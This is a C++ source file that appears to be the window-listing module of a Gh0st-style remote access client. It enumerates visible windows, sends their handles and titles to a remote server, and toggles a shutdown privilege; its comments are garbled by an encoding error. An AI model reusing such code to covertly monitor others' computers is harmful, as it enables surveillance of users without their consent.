#include "ClientWindowManager.h"



CClientWindowManager::CClientWindowManager(_CIOCPClient* ClientObject) :CManager(ClientObject)
{
	EnableSeDebugPrivilege("SeShutdownPrivilege", TRUE);

	SendClientWindowList();
}


CClientWindowManager::~CClientWindowManager()
{
	printf("~CClientWindowManager()\r\n");
	EnableSeDebugPrivilege("SeShutdownPrivilege", TRUE);

}
void CClientWindowManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_WINDOW_REFRESH_REQUIRE:
	{

		SendClientWindowList();

		break;
	}

	}
}
void CClientWindowManager::SendClientWindowList()
{
	//��ϵͳע��һ��ö�ٴ��ڵĺ���
	LPBYTE	BufferData = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowProcedure, (LPARAM)&BufferData);


	if (BufferData != NULL)
	{
		BufferData[0] = CLIENT_WINDOW_MANAGER_REPLY;
	}

	//�����ݰ����͵������
	m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData));
	LocalFree(BufferData);

}
BOOL CALLBACK CClientWindowManager::EnumWindowProcedure(HWND Hwnd, LPARAM ParameterData)
{
	DWORD	BufferLength = 0;
	DWORD	Offset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	BufferData = *(LPBYTE*)ParameterData;

	char  WindowTitleName[0x400] = { 0 };
	memset(WindowTitleName, 0, sizeof(WindowTitleName));
	//�õ�ϵͳ���ݽ����Ĵ��ھ���Ĵ��ڱ���
	GetWindowText(Hwnd, WindowTitleName, sizeof(WindowTitleName));
	//�����ж� �����Ƿ�ɼ� �����Ϊ��
	if (!IsWindowVisible(Hwnd) || lstrlen(WindowTitleName) == 0)
		return TRUE;
	//ͬ���̹���һ������ע�����ķ��͵����ض˵����ݽṹ

	if (BufferData == NULL)
	{
		BufferData = (LPBYTE)LocalAlloc(LPTR, 1);  //��ʱ���仺���� 
	}

	//[Flag][HWND][WindowTitleName]\0[HWND][WindowTitleName]\0
	BufferLength = sizeof(HWND) + lstrlen(WindowTitleName) + 1;
	Offset = LocalSize(BufferData);  //1
									 //���¼��㻺������С
	BufferData = (LPBYTE)LocalReAlloc(BufferData, Offset + BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	//��������memcpy���ܿ������ݽṹΪ hwnd+���ڱ���+0
	memcpy((BufferData + Offset), &Hwnd, sizeof(HWND));
	memcpy(BufferData + Offset + sizeof(HWND), WindowTitleName, lstrlen(WindowTitleName) + 1);

	*(LPBYTE*)ParameterData = BufferData;

	return TRUE;
}